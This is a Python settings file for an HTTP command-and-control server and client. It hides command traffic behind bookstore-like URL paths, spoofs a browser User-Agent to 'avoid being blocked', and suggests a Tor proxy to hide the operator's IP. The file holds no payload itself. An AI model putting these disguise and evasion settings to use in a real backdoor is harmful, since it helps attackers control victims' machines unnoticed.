
#----------Variables used in both Server and Client----------#
# C2 Server Port for client and Server
PORT = 80

#Path to use signifying a command request from a client using HTTP GET
CMD_REQUEST = "/book?isbn="

#Path to use signifying a command output from a client using HTTP GET
RESPONSE = "/inventory"

#Path to use signifying current directory from a client using HTTP GET
CWD_RESPONSE = "/title"


#Post variable name to user for assigning to command output from a client
RESPONSE_KEY = "index"


#----------Variables used in C2 server Only----------#
#Leave blank to Binding to all interfaces, Otherwise Enter C2 Servers IP Address
BIND_ADDR = ""

# We should change User-Agent to avoid being blocked, But other keys is Optional
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                         "Chrome/129.0.0.0 Safari/537.36"}



#----------Variables used in C2 Client Only----------#
# Set TOR Proxy to more secure and hide your IP address
# PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
PROXY = None

#C2 Server IP Address C2_SERVER = "127.0.0.1" 
C2_SERVER = "localhost" 

# Define sleep delay time in seconds for a reconnection attempt
DELAY = 3
